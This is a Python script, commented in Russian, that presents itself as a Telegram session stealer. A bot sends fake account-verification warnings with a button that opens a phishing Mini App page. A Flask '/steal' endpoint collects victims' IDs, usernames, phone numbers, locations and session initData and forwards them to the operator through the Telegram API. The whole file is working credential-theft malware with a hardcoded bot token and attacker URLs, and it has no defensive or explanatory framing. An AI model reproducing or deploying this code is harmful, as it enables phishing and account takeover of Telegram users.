#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Стилер сессий Telegram через Mini App
# Автоустановка, Flask-приёмник, Telegram-бот

import sys
import subprocess
import importlib
import os
import json
import threading
import time

def install(pkg):
    try:
        importlib.import_module(pkg)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", pkg])

for pkg in ["telebot", "flask", "requests"]:
    install(pkg)

import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
from flask import Flask, request, jsonify
import requests

# ========== КОНФИГУРАЦИЯ (данные пользователя) ==========
BOT_TOKEN = "8778362559:AAGYlu7WG0u8J9Uw_-nQbpvhIpdZW56ZxGo"
OWNER_ID = 8343382233
NOTIFY_BOT_TOKEN = BOT_TOKEN

# Адрес вашего Flask-сервера на Bothost (будет https://danilmikxaylov2015.bothost.net)
FLASK_PUBLIC_URL = os.environ.get("FLASK_URL", "https://danilmikxaylov2015.bothost.net")

# ========== FLASK ==========
app = Flask(__name__)
stolen_log = []

@app.route('/')
def index():
    return "Telegram Mini App endpoint. Use bot."

@app.route('/steal', methods=['POST'])
def steal():
    data = request.json
    if not data:
        return jsonify({"status": "error"}), 400
    stolen_log.append(data)

    msg = f"🔥 **УКРАДЕНЫ ДАННЫЕ**\n\n"
    msg += f"👤 ID: `{data.get('user_id')}`\n"
    msg += f"📛 Username: @{data.get('username')}\n"
    msg += f"📞 Телефон: `{data.get('phone')}`\n"
    msg += f"📍 Гео: `{data.get('location')}`\n"
    msg += f"🖥 User-Agent: `{data.get('user_agent', '')[:100]}`\n"
    msg += f"🔑 **initData (сессия):**\n`{data.get('init_data', '')[:500]}`\n"

    try:
        requests.post(f"https://api.telegram.org/bot{NOTIFY_BOT_TOKEN}/sendMessage",
                      json={"chat_id": OWNER_ID, "text": msg, "parse_mode": "Markdown"})
    except Exception as e:
        print("Ошибка отправки уведомления:", e)
    return jsonify({"status": "ok"}), 200

# ========== ТЕЛЕГРАМ БОТ ==========
bot = telebot.TeleBot(BOT_TOKEN)

def get_webapp_button():
    markup = InlineKeyboardMarkup()
    # Статическая фишинг-страница на вашем домене
    PHISH_PAGE_URL = "https://sait-goldrussia.csamp.ru/"
    markup.add(InlineKeyboardButton("🚨 ПОДТВЕРДИТЕ АККАУНТ 🚨", web_app=WebAppInfo(url=PHISH_PAGE_URL)))
    return markup

@bot.message_handler(commands=['start'])
def start_cmd(message):
    bot.send_message(
        message.chat.id,
        "⚠️ **Ваш аккаунт требует верификации!** ⚠️\n\n"
        "Нажмите кнопку ниже и авторизуйтесь для продолжения.\n"
        "Если вы не совершали это действие, проигнорируйте.",
        reply_markup=get_webapp_button(),
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda m: True)
def echo(message):
    bot.send_message(
        message.chat.id,
        "Для доступа нажмите кнопку верификации.",
        reply_markup=get_webapp_button()
    )

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

if __name__ == "__main__":
    print("🚀 Запуск стилера")
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    bot.infinity_polling()
